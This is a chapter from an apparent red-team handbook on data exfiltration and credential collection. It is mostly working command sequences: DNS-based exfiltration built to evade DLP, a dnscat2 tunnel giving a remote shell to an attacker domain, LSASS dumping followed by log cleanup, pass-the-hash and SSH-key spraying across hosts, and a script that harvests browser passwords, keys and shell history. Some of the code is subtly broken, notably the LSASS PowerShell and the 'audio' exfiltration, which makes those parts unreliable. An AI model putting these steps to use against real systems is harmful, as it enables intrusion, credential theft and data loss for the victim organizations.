# Chapter 13: Data Exfiltration and Collection

After establishing persistence as detailed in the previous chapter, a red team operation typically involves exfiltrating valuable data from the target system. This chapter explores sophisticated tools and techniques for gathering sensitive information and transferring it back to your controlled infrastructure while evading detection.

## Introduction to Data Exfiltration

Data exfiltration is often the most critical phase of a red team engagement, as it demonstrates the potential impact of a security breach. However, it's also a phase where many attackers are detected due to unusual network traffic patterns or volume. Effective exfiltration requires:

- **Stealth**: Avoiding detection by security monitoring tools
- **Reliability**: Ensuring complete data transfer even in challenging network conditions
- **Efficiency**: Optimizing the size and speed of data transfer
- **Discretion**: Selecting only the most valuable data to minimize footprint

This chapter explores four powerful tools in the red teamer's arsenal for exfiltrating data while evading common detection mechanisms.

## PacketWhisper: Steganographic Exfiltration

PacketWhisper is an innovative tool that uses DNS queries to exfiltrate data while concealing it using text-based steganography techniques. It can operate even in highly restricted environments where direct outbound connections are blocked.

### Installation

```bash
# Clone the repository
git clone https://github.com/TryCatchHCF/PacketWhisper.git
cd PacketWhisper
```

### Basic Usage

The basic workflow for using PacketWhisper involves three main steps:

1. **Encoding the data for exfiltration**:

```bash
# On the target machine
python3 packetWhisper.py

# Select Option 1: Encode file for exfiltration
# Select a cloaking mode (e.g., 4: Normal Security Scan Results)
# Select a file to exfiltrate
# Choose DNS transfer mode
```

2. **Generating DNS queries to transfer the data**:

```bash
# After encoding, PacketWhisper will show the command to run
# Example:
dig +short qnndymzemeiwwnw.google-public-dns-a.shadows.example.com @8.8.8.8
```

3. **Capturing and decoding the DNS traffic**:

```bash
# On your attacking machine:
# Capture DNS traffic:
tcpdump -i eth0 -w capture.pcap udp port 53

# Decode using PacketWhisper:
python3 packetWhisper.py
# Select Option 2: Decode data from capture file
# Select the capture file
```

### Configuration Options

PacketWhisper offers several configurations to optimize your exfiltration:

#### 1. Cloaking Modes

PacketWhisper provides various text-based cloaking options to help your DNS queries blend into normal traffic:

```bash
# Available cloaking modes:
1. Basic Base64 Encoding
2. Hex Encoding with Special Char Substitution  
3. Hex Encoding with Vulnerable Parameter Cloaking
4. Normal Security Scan Results
5. Web Vulnerability Scan Results
6. HTTP Session Capture
7. Windows Directory Listing
8. Linux Directory Listing
```

The more advanced cloaking options (4-8) are designed to make the DNS queries appear as legitimate traffic to security analysts reviewing logs.

#### 2. DNS Transfer Modes

```bash
# Transfer mode options:
1. Direct DNS Queries (dig)
2. Direct DNS Queries as One-Liner (single command line)
3. DNS Server Query via Copy/Paste
```

For highly restricted environments, the Copy/Paste mode allows transferring data even when you can't execute commands but have access to a DNS lookup tool.

### Example: Bypassing DLP Systems

This example demonstrates how to exfiltrate sensitive data from an environment with Data Loss Prevention (DLP) systems in place:

1. **Prepare the sensitive data for exfiltration**:

```bash
# Compress and encrypt the data first to minimize size and hide content
tar -czf data.tar.gz /path/to/sensitive/documents/
openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.enc -k "SecretPassword123"
```

2. **Configure PacketWhisper for maximum stealth**:

```bash
python3 packetWhisper.py

# Select Option 1: Encode file for exfiltration
# Choose file: data.enc
# Select cloaking mode 6: HTTP Session Capture
# This will make the DNS queries look like captured HTTP sessions
# Select DNS transfer mode 2: Direct DNS Queries as One-Liner
```

3. **Execute the exfiltration gradually to avoid triggering volume-based alerts**:

```bash
# PacketWhisper will generate a shell script - modify it to add delays
sed -i 's/$/\nsleep 3/' dnsExfil.sh

# Execute the script during normal business hours to blend with typical traffic
./dnsExfil.sh
```

4. **Decode the captured data on your attack machine**:

```bash
# After capturing the DNS traffic
python3 packetWhisper.py

# Select Option 2: Decode data from capture file
# Select the packet capture file
# Save the decoded file

# Decrypt and extract
openssl enc -aes-256-cbc -d -in data.enc -out data.tar.gz -k "SecretPassword123"
tar -xzf data.tar.gz
```

This approach helps bypass DLP systems because:
- The data never crosses the network as conventional file transfers
- The content is encrypted before encoding, preventing content inspection
- The DNS queries appear as normal HTTP session captures in logs
- The gradual exfiltration prevents triggering volume-based alerts

## DNScat2: Command and Control Over DNS

DNScat2 establishes a command and control channel over DNS, allowing for bidirectional communication and data exfiltration through DNS queries and responses. This technique is effective because DNS traffic is rarely blocked in corporate environments.

### Installation

```bash
# On your attack machine (server component)
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# On the target machine (client component)
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
```

### Basic Usage

1. **Start the DNScat2 server on your attack machine**:

```bash
# Basic server setup
ruby ./dnscat2.rb --dns "domain=example.com" --no-cache

# For better stealth, use a domain you control
ruby ./dnscat2.rb --dns "domain=exfil.yourdomain.com" --no-cache
```

2. **Connect from the target machine**:

```bash
# Basic client connection
./dnscat2 example.com

# For encrypted communication
./dnscat2 --secret="your_pre_shared_secret" example.com
```

3. **Interact with the session on the server**:

```bash
# In the dnscat2 server interface:
dnscat2> session -i 1
dnscat2> shell
dnscat2> exec "cat /etc/passwd"
```

### Tunneling Techniques

DNScat2 provides various tunneling capabilities:

#### 1. Command Shell Tunneling

```bash
# On the server, after establishing a connection:
dnscat2> session -i 1
dnscat2> shell
```

This opens an interactive shell tunnel over DNS.

#### 2. File Transfer Over DNS

```bash
# On the server:
dnscat2> session -i 1
dnscat2> download /path/to/remote/file /path/to/local/destination
dnscat2> upload /path/to/local/file /path/to/remote/destination
```

#### 3. Port Forwarding Over DNS

```bash
# On the server, forward local port 8080 to remote port 80:
dnscat2> session -i 1
dnscat2> listen 8080 localhost 80
```

This allows you to access services on the internal network through the DNS tunnel.

### Example: Bypassing Firewall Restrictions

This example demonstrates using DNScat2 to exfiltrate data from a network where all conventional outbound traffic is blocked except DNS:

1. **Prepare your external infrastructure**:

```bash
# Register a domain and configure its NS records to point to your server
# Configure your server to accept DNS requests for your domain

# Start the DNScat2 server with encryption
ruby ./dnscat2.rb --dns "domain=exfil.yourdomain.com" --no-cache --secret="ComplexPreSharedKey2023!"
```

2. **Establish the DNS tunnel from the target system**:

```bash
# Execute the client with encryption
./dnscat2 --secret="ComplexPreSharedKey2023!" exfil.yourdomain.com
```

3. **Set up port forwarding to access internal services**:

```bash
# On the DNScat2 server:
dnscat2> session -i 1
dnscat2> listen 8080 10.0.0.100 3389
```

This forwards connections to port 8080 on your attack machine to the internal RDP server at 10.0.0.100:3389.

4. **Exfiltrate large files efficiently**:

```bash
# First, prepare the data on the target system:
tar -czf /tmp/exfil.tar.gz /path/to/sensitive/data/
split -b 10M /tmp/exfil.tar.gz /tmp/exfil_part_

# On the DNScat2 server:
dnscat2> session -i 1
dnscat2> shell

# In the shell session:
for part in /tmp/exfil_part_*; do
  echo "Transferring $part..."
  base64 $part | tr -d '\n' > $part.b64
  cat $part.b64
done > received_data.b64

# On your attack machine, outside DNScat2:
cat received_data.b64 | base64 -d > exfil.tar.gz
tar -xzf exfil.tar.gz
```

This technique works effectively because:
- DNS traffic is rarely blocked completely, even in highly restricted environments
- The encrypted tunnel prevents inspection of the actual data being transferred
- Breaking large files into smaller chunks helps avoid detection based on DNS query size
- Using base64 encoding ensures the data can be transferred as valid DNS names

## Mimikatz (on Linux): Credential Extraction

While Mimikatz is primarily known as a Windows tool, its capabilities can be leveraged from Linux systems to extract Windows credentials, especially in mixed environments.

### Installation

```bash
# On Kali Linux, Mimikatz is usually pre-installed
# If not, you can install it:
apt update
apt install mimikatz

# For cross-platform usage, also install Wine:
apt install wine winetricks
```

### Basic Usage

There are several approaches to using Mimikatz from Linux environments:

#### 1. Running Mimikatz through Wine

```bash
# Download Mimikatz Windows binary
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
wine mimikatz.exe
```

#### 2. Using Mimikatz-compatible features in Linux tools

```bash
# Secretsdump from Impacket
impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM -hashes lmhash:nthash LOCAL
```

### Cross-platform Techniques

Mimikatz functionality can be leveraged in Linux through several methods:

#### 1. Remote extraction using Impacket

```bash
# Extract credentials directly from a remote domain controller
impacket-secretsdump domain.local/administrator@10.0.0.10 -just-dc
```

#### 2. NTDS.dit extraction and processing

```bash
# First, create a shadow copy on the Windows system
vssadmin create shadow /for=C:

# Copy NTDS.dit and SYSTEM registry hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Transfer these files to your Linux system
# Then extract credentials
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### 3. In-memory credential extraction from Linux

```bash
# Using Pypykatz (Python implementation of Mimikatz)
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

### Example: Extracting Windows Credentials from Linux

This example demonstrates a complete workflow for extracting Windows domain credentials from a Linux system with network access to Windows machines:

1. **Identify domain controllers and potential targets**:

```bash
# Scan the network for Windows systems
nmap -p 445 --script smb-os-discovery 10.0.0.0/24

# Identify domain controllers
nmap -p 389 --script ldap-rootdse 10.0.0.0/24
```

2. **Leverage a compromised Windows system to extract LSASS memory**:

```bash
# Create a PowerShell script to dump LSASS safely
cat > dump_lsass.ps1 << EOF
\$proc = Get-Process lsass
\$dumpfile = "C:\Windows\Temp\lsass.dmp"
\$handle = [PSObject].Assembly.GetType('Microsoft.Win32.SafeHandles.SafeProcessHandle')
\$constructor = [Runtime.InteropServices.HandleRef].GetConstructor([IntPtr], [Boolean])
\$safeProcessHandle = $handle::new($proc.Handle, $true)
\$method = [System.Diagnostics.Process].GetMethod('MiniDumpWriteDump', [Reflection.BindingFlags] 'Static, NonPublic')
\$method.Invoke(\$null, @($safeProcessHandle, \$proc.Id, [IO.File]::Create(\$dumpfile).SafeFileHandle, 2, 0, 0, 0))
EOF

# Transfer and execute the script on the compromised Windows host
smbclient //10.0.0.50/C$ -U compromised_user
smb> put dump_lsass.ps1 Windows\\Temp\\dump_lsass.ps1
smb> exit

# Execute the script remotely
impacket-wmiexec domain.local/compromised_user@10.0.0.50 "powershell -ep bypass -File C:\\Windows\\Temp\\dump_lsass.ps1"

# Retrieve the dump file
smbclient //10.0.0.50/C$ -U compromised_user
smb> get Windows\\Temp\\lsass.dmp /tmp/lsass.dmp
smb> del Windows\\Temp\\lsass.dmp
smb> del Windows\\Temp\\dump_lsass.ps1
smb> exit
```

3. **Extract credentials from the dump using Pypykatz**:

```bash
# Process the dump file
pypykatz lsa minidump /tmp/lsass.dmp > /tmp/credentials.txt

# Format and organize the extracted credentials
grep -A 2 "Username" /tmp/credentials.txt | grep -v "^--" > /tmp/users_and_hashes.txt
```

4. **Use extracted credentials for lateral movement**:

```bash
# Test extracted NTLM hashes across the network
for ip in $(cat target_ips.txt); do
  for user in $(cat /tmp/users_and_hashes.txt | grep Username | cut -d ":" -f2 | tr -d " "); do
    hash=$(grep -A 1 "Username : $user" /tmp/users_and_hashes.txt | grep "NT" | cut -d ":" -f2 | tr -d " ")
    echo "Testing $user:$hash on $ip"
    impacket-psexec -hashes :$hash domain.local/$user@$ip "whoami" 2>/dev/null
  done
done
```

This approach is effective because:
- It leverages the strengths of both Windows and Linux systems
- The memory dump approach bypasses many endpoint protections
- Processing the dump on Linux avoids Windows-based security controls
- The modular approach allows for adaptation to different network environments

## LaZagne: Password Recovery

LaZagne is a powerful open-source application designed to retrieve passwords stored on local computers from various sources including browsers, databases, mail clients, and more.

### Installation

```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install requirements
pip3 install -r requirements.txt

# Build the standalone binary (optional)
cd Linux
pyinstaller --onefile --hidden-import=secretstorage --add-data "laZagne.ico:." --icon=laZagne.ico laZagne.py
```

### Basic Usage

```bash
# Run all modules (requires root)
sudo python3 laZagne.py all

# Run specific modules
python3 laZagne.py browsers
python3 laZagne.py sysadmin
python3 laZagne.py browsers -firefox
```

### Module Configuration

LaZagne contains multiple categories of modules:

#### 1. Browsers

```bash
# Extract passwords from all supported browsers
python3 laZagne.py browsers

# Target specific browsers
python3 laZagne.py browsers -firefox -chromium -opera
```

#### 2. System Administrator Tools

```bash
# Extract credentials from sysadmin tools
python3 laZagne.py sysadmin

# Target specific tools
python3 laZagne.py sysadmin -filezilla -env
```

#### 3. Databases

```bash
# Extract database credentials
python3 laZagne.py databases

# Target specific database systems
python3 laZagne.py databases -mysql -postgresql
```

#### 4. Customizing Output

```bash
# Write results to a file in different formats
python3 laZagne.py all -oA -output /tmp/
python3 laZagne.py all -oJ -output /path/to/json/output.json
python3 laZagne.py all -oN -output /path/to/txt/output.txt
```

### Example: Comprehensive Credential Harvesting

This example demonstrates a systematic approach to credential harvesting using LaZagne in a red team scenario:

1. **Create a credential harvesting script**:

```bash
cat > harvest_creds.sh << 'EOF'
#!/bin/bash

# Create output directory
OUTPUT_DIR="/tmp/.harvested_$(date +%Y%m%d%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[+] Starting credential harvesting..."

# System information
echo "[*] Gathering system information..."
hostname > $OUTPUT_DIR/system_info.txt
whoami >> $OUTPUT_DIR/system_info.txt
ip addr show | grep -E "inet " >> $OUTPUT_DIR/system_info.txt

# Run LaZagne with different privilege levels
echo "[*] Running LaZagne with current privileges..."
python3 /path/to/LaZagne/laZagne.py all -oJ -output $OUTPUT_DIR/lazagne_user.json 2>/dev/null

# Attempt privilege escalation if not root
if [ $(id -u) -ne 0 ]; then
    echo "[*] Attempting to run with elevated privileges..."
    echo "Credential harvesting in progress..." | sudo -S python3 /path/to/LaZagne/laZagne.py all -oJ -output $OUTPUT_DIR/lazagne_root.json 2>/dev/null
fi

# Extract SSH keys
echo "[*] Gathering SSH keys..."
mkdir -p $OUTPUT_DIR/ssh_keys
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -exec cp {} $OUTPUT_DIR/ssh_keys/ \; 2>/dev/null

# Extract history files
echo "[*] Gathering shell history..."
mkdir -p $OUTPUT_DIR/history
find /home -name ".bash_history" -o -name ".zsh_history" -exec cp {} $OUTPUT_DIR/history/ \; 2>/dev/null

# Extract browser profiles for offline analysis
echo "[*] Gathering browser profiles..."
mkdir -p $OUTPUT_DIR/browsers
for user in $(ls /home); do
    if [ -d "/home/$user/.mozilla" ]; then
        mkdir -p $OUTPUT_DIR/browsers/firefox_$user
        cp -r /home/$user/.mozilla/firefox/*default*/logins.json $OUTPUT_DIR/browsers/firefox_$user/ 2>/dev/null
        cp -r /home/$user/.mozilla/firefox/*default*/key*.db $OUTPUT_DIR/browsers/firefox_$user/ 2>/dev/null
        cp -r /home/$user/.mozilla/firefox/*default*/cert*.db $OUTPUT_DIR/browsers/firefox_$user/ 2>/dev/null
    fi
    
    if [ -d "/home/$user/.config/google-chrome" ]; then
        mkdir -p $OUTPUT_DIR/browsers/chrome_$user
        cp -r /home/$user/.config/google-chrome/Default/Login\ Data $OUTPUT_DIR/browsers/chrome_$user/ 2>/dev/null
    fi
done

# Package results
echo "[*] Packaging results..."
ARCHIVE="/tmp/system_$(hostname)_$(date +%Y%m%d).tar.gz"
tar -czf $ARCHIVE -C $(dirname $OUTPUT_DIR) $(basename $OUTPUT_DIR)

# Display results location
echo "[+] Credential harvesting complete!"
echo "[+] Results stored at: $ARCHIVE"
EOF

chmod +x harvest_creds.sh
```

2. **Execute the credential harvesting script**:

```bash
# Run the script with current privileges
./harvest_creds.sh

# Or run with elevated privileges if available
sudo ./harvest_creds.sh
```

3. **Analyze the harvested data**:

```bash
# Extract the archive
tar -xzf /tmp/system_hostname_20230822.tar.gz -C /tmp/

# Parse the JSON output
python3 -m json.tool /tmp/.harvested_20230822120000/lazagne_root.json | less

# Create a summary of discovered credentials
cat > parse_creds.py << 'EOF'
#!/usr/bin/env python3
import json
import sys
import os

def parse_lazagne_json(filename):
    with open(filename, 'r') as f:
        data = json.load(f)
    
    print(f"\n{'='*60}")
    print(f"Credentials from {filename}")
    print(f"{'='*60}\n")
    
    for software_category in data:
        for software_name, accounts in software_category.items():
            if accounts:
                print(f"\n[+] {software_name}:")
                for account in accounts:
                    print(f"    - URL: {account.get('url', 'N/A')}")
                    print(f"    - Username: {account.get('login', 'N/A')}")
                    print(f"    - Password: {account.get('password', 'N/A')}")
                    print(f"    {'-'*50}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: parse_creds.py <lazagne_json_file>")
        sys.exit(1)
    
    parse_lazagne_json(sys.argv[1])
EOF

chmod +x parse_creds.py
./parse_creds.py /tmp/.harvested_20230822120000/lazagne_root.json > /tmp/credentials_summary.txt
```

4. **Leverage the discovered credentials for lateral movement**:

```bash
# Extract SSH keys for lateral movement
cp /tmp/.harvested_20230822120000/ssh_keys/* ~/.ssh/
chmod 600 ~/.ssh/id_*

# Test SSH access to other systems
for key in ~/.ssh/id_*; do
    for host in $(cat target_hosts.txt); do
        echo "Trying $key on $host..."
        ssh -i $key -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@$host hostname 2>/dev/null
    done
done
```

This comprehensive approach is effective because:
- It systematically harvests credentials from multiple sources
- It attempts to escalate privileges to access more protected credentials
- It collects raw profile data for offline analysis with more advanced tools
- It preserves and organizes the data for effective post-exploitation activities

## Advanced Data Exfiltration Techniques

Beyond the tools covered above, consider these additional exfiltration techniques:

### 1. ICMP Tunneling with PTunnel

```bash
# On your attack machine:
ptunnel -p proxy.example.com -lp 8000 -da internal-server.local -dp 22

# On the target machine:
ssh -p 8000 user@localhost
```

This tunnels SSH traffic over ICMP echo requests (ping), which are often allowed through firewalls.

### 2. Image-based Steganography

```bash
# Hide data within an image
steghide embed -cf innocent.jpg -ef secret_data.txt -p "password123"

# Extract the hidden data
steghide extract -sf innocent.jpg -p "password123"
```

This conceals data within normal-looking image files, making exfiltration difficult to detect.

### 3. Audio-based Exfiltration

```bash
# Convert data to audio
cat secret_data.txt | xxd -p | tr -d '\n' > hex_data.txt
python3 -c "import sys; open('data.wav', 'wb').write(bytes.fromhex(open('hex_data.txt').read()))"

# Extract data from audio
cat data.wav | xxd -p | tr -d '\n' > recovered_hex.txt
python3 -c "import sys; open('recovered.txt', 'w').write(bytes.fromhex(open('recovered_hex.txt').read()).decode('utf-8'))"
```

This technique can bypass data loss prevention systems that aren't configured to analyze audio content.

## Conclusion

Data exfiltration and credential harvesting are critical phases in red team operations that demonstrate the real impact of a security breach. The tools and techniques covered in this chapter provide powerful capabilities for extracting valuable information while evading common detection mechanisms.

Remember that as a professional red teamer, your objective is to help organizations identify and address their security weaknesses. Always operate within the scope of your engagement and with proper authorization. 

In the next chapter, we'll explore sophisticated man-in-the-middle frameworks for intercepting and analyzing network traffic.
